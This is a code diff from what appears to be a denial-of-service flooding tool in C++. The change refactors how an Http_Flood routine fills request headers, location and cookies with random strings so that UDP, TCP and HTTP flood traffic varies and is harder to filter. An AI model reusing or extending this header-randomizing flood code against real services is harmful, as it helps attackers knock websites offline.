@@ -217,12 +217,12 @@ void Http_Flood::init_header(httphdr *header) {
     switch (conf->vector){
         case Config::UDPFlood:
         case Config::TCPFlood:
-            header->overide(const_cast<std::string &>(Randomizer::randomstr()));
+            Randomizer::randomstr((std::string&)*header);
             break;
         case Config::HTTP:{
             header->method = Randomizer::random_method();
             if(conf->RandomizeHeader){
-                header->location = Randomizer::randomstr();
+                Randomizer::randomstr(header->location);
             }
             header->useragent = Randomizer::random_useragent(*(conf->useragents));
             header->cache_control = Randomizer::random_caching();
@@ -232,7 +232,8 @@ void Http_Flood::init_header(httphdr *header) {
             header->accept = "*/*";
             header->connection_type = "Keep-Alive";
             header->content_type = Randomizer::random_contenttype();
-            header->cookie = {Randomizer::randomstr(), Randomizer::randomstr()};
+            Randomizer::randomstr(header->cookie[0]);
+            Randomizer::randomstr(header->cookie[1]);
             header->keep_alive = Randomizer::randomInt(1, 5000);
             header->DNT = Randomizer::randomInt(0, 1);
             header->generate();
